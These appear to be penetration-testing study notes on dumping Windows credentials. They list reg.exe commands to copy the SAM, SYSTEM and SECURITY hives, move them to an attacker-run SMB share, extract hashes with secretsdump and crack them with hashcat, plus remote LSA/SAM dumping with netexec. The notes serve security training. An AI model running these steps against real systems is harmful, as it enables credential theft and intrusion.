### Registry Hives
- 3 registry hives we can copy if we have local administrative access to a target system
- Each serves specific purpose regarding dumping and cracking password hashes

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|
- We can backup these hives using `reg.exe` utility

1. **Using reg.exe to Copy Registry Hives**
	- Launch `cmd.exe` with administrative privileges
	- `reg.exe save hklm\[registry hive] C:\[registry hive name].save`

2. **Personal Machine - Creating a Share with Smbserver**
	- `sudo smbserver.py -smb2support CompData [path to directory to use as share storage]`

3. **Target Machine - Moving Hive Copies to share**
	- `move C:\[registry hive name].save \\[personal machine IP]\CompData`

4. **Dumping Hashes with Secretsdump**
	- `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
	- `Dumping local SAM hashes (uid:rid:lmhash:nthash)`: Tells us how to interpret the output

5. **Cracking Hashes with Hashcat**
	- `sudo hashcat -m 1000 hashestocrack.txt rockyou.txt`

### DCC2 Hashes
- `hklm\security` contains cached domain logon information in the form of DCC2 hashes
- These start with `$DCC2$`
- Much more difficult to crack than an NT hash
- Cannot be used for lateral movement with techniques like Pass-the-Hash
- **Hashcat Mode**: `2100`
- ~ 800 times slower cracking speed than NTLM hashes on Hashcat

### DPAPI
- Data Protection Application Programming Interface
- A set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
- Can be decrypted manually with tools like Impacket's `dpapi`, `mimikatz`, or remotely with `DonPAPI`
	- `mimikatz.exe`

### Remote Dumping & LSA Secrets Considerations
- Allows us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets

1. **Personal Machine - Dumping LSA Secrets Remotely**
	- `netexec smb [target machine IP] --local-auth -u [username] -p [password] --lsa`
2. **Personal Machine - Dumping SAM Remotely**
	- `netexec smb [target machine IP] --local-auth -u [username] -p [password] --sam`
